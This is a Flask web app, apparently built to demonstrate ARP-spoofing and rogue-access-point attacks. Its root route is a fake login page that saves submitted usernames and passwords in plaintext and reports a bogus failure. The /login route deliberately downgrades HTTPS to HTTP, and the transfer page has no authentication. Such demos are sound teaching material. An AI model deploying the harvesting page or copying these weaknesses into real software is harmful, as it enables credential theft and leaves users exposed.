from flask import Flask, render_template, request, redirect, url_for
import mysql.connector
import re
import sys
from config import config
import socket

app = Flask(__name__, static_folder='static')

@app.route('/transfer', methods =['GET', 'POST'])
def transfer():
  msg = ''
  try:
        connection = mysql.connector.connect(**config)
        cursor = connection.cursor(prepared=True)

        if request.method == 'POST':
            name = request.form.get('name')
            iban = request.form.get('iban')
            amount = request.form.get('amount')
            purpose = request.form.get('purpose')

            if not name or not iban or not amount:
                msg = 'Please fill out the form!'
                
            elif not re.match(r'^[A-Z]{2}(?:[ ]?[0-9]){18,20}$', iban):
                msg = 'Invalid IBAN!'

            else:
                query = "INSERT INTO accounts VALUES (DEFAULT, %s, %s, %s, %s)"
                cursor.execute(query, (name, iban, amount, purpose))
                connection.commit()

                msg = 'You have successfully transferred'

  except mysql.connector.Error as error:
        print("Failed to execute the Query".format(error))

  finally:
        
        if (connection.is_connected()):
            cursor.close()
            connection.close()
            print("MySQL connection is closed")

  return render_template('transfer.html', msg=msg)

#Start Seite
@app.route('/home')
def home():
    return render_template('home.html')

@app.route('/login', methods=['POST', 'GET'])
def login():
    msg = ''

    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]

        try:
            connection = mysql.connector.connect(**config)
            cursor = connection.cursor(prepared=True)
            query = "SELECT * FROM admins WHERE username = %s AND password = %s"
            cursor.execute(query, (username, password))
            result = cursor.fetchone()

            if result:
                return redirect(url_for("transfer"))
            
            else:
                msg = 'Invalid Login Details'

        except mysql.connector.Error as error:
            print("Failed to fetch data from admin {}".format(error))

        finally:
            if (connection.is_connected()):
                cursor.close()
                connection.close()
                print("Connection is closed!")

    if request.is_secure:
        return redirect("http://localhost:5000/login")

    else:
        return render_template('login.html', msg=msg)

@app.route('/loginsecure', methods=['POST', 'GET'])
def loginsecure():
    msg = ''

    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]

        try:
           connection = mysql.connector.connect(**config)
           cursor = connection.cursor(prepared=True)
           query = "SELECT * FROM admins WHERE username = %s AND password = %s"
           cursor.execute(query, (username, password))
           result = cursor.fetchone() 

           if result:
                return redirect(url_for("transfer"))
           
           else:
                msg = 'Invalid Login Details'

        except mysql.connector.Error as error:
            print("Failed to fetch data from admin {}".format(error))

        finally:
            if (connection.is_connected()):
                cursor.close()
                connection.close()
                print("Connection is closed!")
                  
    if not request.is_secure:
        return redirect("https://localhost:5001/loginsecure")

    return render_template('securelogin.html', msg = msg)

@app.route('/', methods=['POST', 'GET'])
def login_arp():
    msg = ''

    if request.method == "POST":
        username = request.form['username']
        password = request.form['password']
        try:
            connection = mysql.connector.connect(**config)
            cursor = connection.cursor()
            cursor.execute('INSERT INTO logins VALUES (%s, %s)', (username, password))
            connection.commit()
            msg = 'Login fehlgeschlagen. Bitte versuchen Sie es später erneut.'
        except mysql.connector.Error as error:
            print("Failed{}".format(error))
            
        finally:
            if (connection.is_connected()):
                cursor.close()
                connection.close()
                print("Connection is closed!")

    return render_template('login_arp.html', msg = msg)

@app.route('/schutz')
def schutz():
    return render_template('schutz.html')

@app.route('/proxy')
def proxy():
    return render_template('proxy.html')

@app.route('/general')
def general():
    return render_template('general.html')

@app.route('/tools')
def tools():
    return render_template('tools.html')

@app.route('/arp')
def arp():
    return render_template('arp.html')

@app.route('/rouge')
def rouge():
    return render_template('rouge.html')

if __name__ == '__main__':
    if len(sys.argv) == 2:
        app.run(host='0.0.0.0', port=5001, ssl_context=('certificate.pem', 'private_key.pem'))
    else:
        app.run(host='0.0.0.0', port=80)
